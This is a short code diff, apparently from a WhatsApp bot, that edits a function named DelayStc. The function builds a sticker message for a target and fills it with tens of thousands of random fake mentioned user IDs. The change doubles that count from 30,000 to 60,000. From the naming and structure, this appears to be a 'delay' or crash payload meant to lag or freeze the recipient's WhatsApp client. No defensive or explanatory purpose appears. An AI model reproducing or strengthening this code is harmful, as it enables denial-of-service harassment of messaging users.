@@ -45,7 +45,7 @@ export default handler;
 async function DelayStc(rikz, isTarget) {
   const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';
 
-  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
+  const mentionedJid = Array.from({ length: 60000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
 
   const stickerMsg = {
     key: {
